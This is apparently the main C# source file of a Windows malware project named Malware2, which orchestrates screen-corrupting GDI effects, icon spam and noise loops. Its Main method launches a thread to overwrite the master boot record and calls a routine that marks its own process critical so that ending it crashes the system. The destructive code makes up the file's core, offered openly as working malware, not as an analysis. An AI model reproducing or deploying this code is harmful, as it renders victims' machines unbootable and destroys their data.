using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using System.Threading;
using NAudio.Wave;
using System.Runtime.InteropServices;
using System;
using System.Drawing;
using System.Media;

namespace Malware2
{
    public class Program
    {
        [DllImport("user32.dll")]
        static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

        public static void Limp()
        {
            for (int num = 0; num < 10; num++)
            {
                InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);
                Thread.Sleep(10);
            }
        }

        [DllImport("user32.dll")]
        static extern IntPtr GetWindowDC(IntPtr hwnd);

        [DllImport("Shell32.dll", EntryPoint = "ExtractIconExW", CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
        private static extern int ExtractIconEx(string sFile, int iIndex, out IntPtr piLargeVersion, out IntPtr piSmallVersion, int amountIcons);

        public static void IconsSpawn()
        {
            Bitmap icon1 = Malware2.Properties.Resources.Erro;
            Icon icon2 = Malware2.Properties.Resources.skull_Reall;
            Bitmap icon3 = Malware2.Properties.Resources.WarningSimbol;

            IntPtr dc = GetWindowDC(IntPtr.Zero);
            Random rand = new Random();
            while (true)
            {
                int x = rand.Next(Screen.PrimaryScreen.Bounds.Width);
                int y = rand.Next(Screen.PrimaryScreen.Bounds.Height);

                int x2 = rand.Next(-0, Screen.PrimaryScreen.Bounds.Width);
                int y2 = rand.Next(-10, Screen.PrimaryScreen.Bounds.Height);

                int x3 = rand.Next(Screen.PrimaryScreen.Bounds.Width);
                int y3 = rand.Next(Screen.PrimaryScreen.Bounds.Height);

                int x4 = rand.Next(Screen.PrimaryScreen.Bounds.Width);
                int y4 = rand.Next(Screen.PrimaryScreen.Bounds.Height);

                int x5 = rand.Next(Screen.PrimaryScreen.Bounds.Width);
                int y5 = rand.Next(Screen.PrimaryScreen.Bounds.Height);

                int x6 = rand.Next(Screen.PrimaryScreen.Bounds.Width);
                int y6 = rand.Next(Screen.PrimaryScreen.Bounds.Height);

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawImage(icon1, x, y);
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawIcon(icon2, x2, y2);
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawIcon(icon2, x3, y3);
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawImage(icon1, x4, y4);
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawImage(icon3, x5, y5);
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawImage(icon3, x6, y6);
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawImage(icon1, rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawImage(icon1, rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawImage(icon1, rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawImage(icon1, rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawImage(icon1, rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));
                }

                using (Graphics g = Graphics.FromHdc(dc))
                {
                    g.DrawImage(icon1, rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));
                }
            }

        }

        public static void IconsMousePoint()
        {
            while (true)
            {
                Cursor cursor = new Cursor(Cursor.Current.Handle);
                int PosX = Cursor.Position.X;
                int PosY = Cursor.Position.Y;

                var rand = new Random();

                IntPtr desktop = GetWindowDC(IntPtr.Zero);

                using (Graphics g = Graphics.FromHdc(desktop))
                {
                    g.DrawImage(Malware2.Properties.Resources.Erro, PosX, PosY);

                    g.DrawImage(Malware2.Properties.Resources.WarningSimbol, rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));

                    Thread.Sleep(100);
                }
            }
        }

        public static void SonsDoSistemaIcons()
        {
            SystemSound[] sounds = {
            SystemSounds.Hand,
            SystemSounds.Question,
            SystemSounds.Exclamation,
            SystemSounds.Beep,
            SystemSounds.Asterisk
        };

            Random rand = new Random();

            while (true)
            {
                SystemSound selectedSound = sounds[rand.Next(sounds.Length)];
                selectedSound.Play();

                Thread.Sleep(1000);
            }
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

        private const int BreakOnTermination = 0x1D;
        private static int isCritical = 1;

        public static void bsod()
        {
           Process.EnterDebugMode();
           IntPtr handle = Process.GetCurrentProcess().Handle;
           NtSetInformationProcess(handle, BreakOnTermination, ref isCritical, sizeof(int));
        }

        public static void Main()
        {
            MsgBox.Mensagem();

            Thread icos = new Thread(IconsSpawn);
            Thread icosPoint = new Thread(IconsMousePoint);
            Thread icosSounds = new Thread(SonsDoSistemaIcons);
            Thread gd1 = new Thread(SpecialCarga.EffectSpecial1);
            Thread gd2 = new Thread(SpecialCarga2.EfeitoOndulacaoNaTela);
            Thread gd3 = new Thread(Carga.Gdi1);
            Thread gd4 = new Thread(SpecialCarga2.TurbilaoCores);
            Thread gd5 = new Thread(SpecialCarga.EffectMinecraftHAHA);
            Thread gd6 = new Thread(SpecialCarga3.PiscaPisca);
            Thread gd7 = new Thread(SpecialCarga3.TelaBugadaRgb);
            Thread gd8 = new Thread(SpecialCargaStars.EfeitoEstrelas);

            var som1 = new Byte1();
            var wave1 = new WaveOut();

            var som2 = new Byte2();
            var wave2 = new WaveOut();

            var som3 = new Byte3();
            var wave3 = new WaveOut();

            var som4 = new Byte4();
            var wave4 = new WaveOut();

            var som5 = new Byte5();
            var wave5 = new WaveOut();

            var som6 = new Byte6();
            var wave6 = new WaveOut();

            //===================
            Thread mbr = new Thread(Mbr.Mbr_Overwrite);

            mbr.Start();
            bsod();
            //===================

            wave1.Init(som1);
            wave1.Play();
            gd1.Start();

            Thread.Sleep(1000 * 10);

            icos.Start();
            wave2.Init(som2);
            wave2.Play();
            gd2.Start();

            Thread.Sleep(1000 * 10);

            wave1.Stop();
            gd3.Start();

            Thread.Sleep(1000 * 10);

            Limp();
            wave2.Stop();
            gd1.Abort();
            gd2.Abort();
            gd3.Abort();
            icos.Abort();

            wave3.Init(som3);
            wave3.Play();
            gd4.Start();

            Thread.Sleep(1000 * 16);

            Limp();
            wave3.Stop();
            gd4.Abort();

            icosSounds.Start();
            icosPoint.Start();

            Thread.Sleep(1000 * 10);

            icosSounds.Abort();
            icosPoint.Abort();

            wave4.Init(som4);
            wave4.Play();
            gd5.Start();

            Thread.Sleep(1000 * 10);

            wave4.Stop();
            wave5.Init(som5);
            wave5.Play();
            gd6.Start();
            Thread.Sleep(3000);
            gd7.Start();

            Thread.Sleep(1000 * 15);

            gd5.Abort();
            gd6.Abort();
            gd7.Abort();
            wave5.Stop();
            wave4.Stop();

            wave6.Init(som6);
            wave6.Play();

            gd8.Start(); // Efeito Das Estrelas

            Thread.Sleep(-1);
        }
    }
}
